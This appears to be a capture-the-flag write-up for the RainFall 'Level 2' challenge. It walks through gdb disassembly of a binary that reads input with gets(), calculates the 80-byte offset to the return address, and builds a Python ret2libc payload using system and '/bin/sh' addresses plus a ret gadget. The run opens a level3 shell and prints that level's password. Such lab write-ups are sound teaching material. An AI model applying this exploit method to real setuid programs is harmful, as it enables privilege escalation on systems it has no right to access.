# Level 2

first we check the escutable file we found our binary wait an input and print the string.

we use gdb to disassemble the main function and that what we got:

```c
Dump of assembler code for function main:
 0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

in the main we see they call p function let see what's do :

```c
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

in the line <+25> in function P they call the [gets](https://linux.die.net/man/3/gets) function.

we assume that's a BufferOverFlow vulnerability then we try to give it a long chaine of character, we got a segFault.

```c
(gdb) run
Starting program: /home/user/level2/level2
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppaaaabbbbcccczzzz
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopppp

Program received signal SIGSEGV, Segmentation fault.
0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
```

we need to know th size of the buffer to know how many character we need to send to the program.
in p function we look at the line <+19> we see that they use `ebp-0x4c` to store the input.

```c
    0x080484da <+6>:	mov    eax,ds:0x8049860
    0x080484df <+11>:	mov    DWORD PTR [esp],eax
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>

```

let's get the address of `ebp-0x4c` and `return Address` in gdb

```
(gdb) x/x $ebp-0x4c
0xbffff6ac:	0x00000001
(gdb) info frame
Stack level 0, frame at 0xbffff700:
eip = 0x80484da in p; saved eip 0x804854a
called by frame at 0xbffff710
Arglist at 0xbffff6f8, args:
Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
Saved registers:
ebp at 0xbffff6f8, eip at 0xbffff6fc
```

the address of `ebp-0x4c` is `0xbffff6ac`
the address of `return Address` is `0xbffff6fc`

0xbffff6fc - 0xbffff6ac = 0x50 = 80

the size of the buffer is 80 bytes.

we need to send 80 bytes to the program to overwrite the return Address.

we can use python to do that.

```c
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
(gdb) info proc mappings
process 3848
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb)
```

as you see we have look for the address of the function system and the address of the string "/bin/sh" in the memory.

now we can write a python script to do that.

```python
padding = 'A'*80
addressSystem =  "\x60\xb0\xe6\xb7"
binsh= "\x58\xcc\xf8\xb7"
print padding+addressSystem+"0000"+binsh
```

we try to run the script and we got the system address printed.

```c
level2@RainFall:~$ cat script -| ./level2
(0xb7e6b060)

```

we check the instruction in the function p and we see that they use `system` to execute the command.

```c
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
```

we found they check if the address not start with `0xb0000000` and if it's not they jump to the address `0x08048527 <+83>`. else they print the address and exit.

to bypass this we need to pass a address that not start with `0xb0000000` and we can do that by using the address of the return address `0x08048538`

```python
padding = 'A'*80
addressSystem =  "\x60\xb0\xe6\xb7" #address of system
returnAddr = "\x3e\x85\x04\x08" #address of return address
binsh="\x58\xcc\xf8\xb7" #address of /bin/sh
print padding+returnAddr+addressSystem+"0000"+binsh
```

now we can run the script and we got it .

```c
level2@RainFall:~$ cat script -|./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��0000X��
whoami
level3
ls ../level3
ls: cannot access ../level3: Permission denied
whoami
level3
cd ../level3
ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```
